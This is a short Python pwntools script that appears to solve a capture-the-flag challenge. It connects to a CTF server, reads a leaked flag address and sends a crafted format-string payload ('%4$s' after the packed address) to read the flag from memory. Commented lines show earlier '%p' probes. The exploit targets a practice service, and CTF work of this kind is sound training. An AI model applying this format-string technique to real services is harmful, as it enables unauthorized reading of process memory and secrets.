import os, sys
import argparse

from pwn import *

def main( args ):
    
    proc = remote( 'nc.ctf.setodanote.net', 26502 )
    
    cnt = 0
    while True:
        
        bstr = proc.recvline( timeout=2 )
        print( f"{cnt}: {bstr}, split(): {bstr.split()}" )
        
        if len(bstr) > 0:
            bstr_split = bstr.split()
            
            if b'flag' in bstr_split:
                
                adrs = int( bstr_split[2][1:-1], 16 )
                lst = [ (adrs      ) & 0xFF,
                        (adrs >>  8) & 0xFF,
                        (adrs >> 16) & 0xFF,
                        (adrs >> 24) & 0xFF ]
                
                #ss = adrs.to_bytes( 4, 'little' ) + "%p,%p,%p,%p,%p".encode('utf-8')
                #ss = adrs.to_bytes( 4, 'little' ) + "%p,%p,%p,%s,%p".encode('utf-8')
                ss = adrs.to_bytes( 4, 'little' ) + "%4$s".encode('utf-8')
                print( ss.hex() )
                
                bstr = proc.recv( timeout=2 )
                print( f"00: {bstr}" )
                
                proc.sendline( ss )
                
                bstr = proc.recv( timeout=2 )
                print( f"00: {bstr}" )
        
        else:
            cnt += 1

if __name__ == '__main__':
    
    main( args )
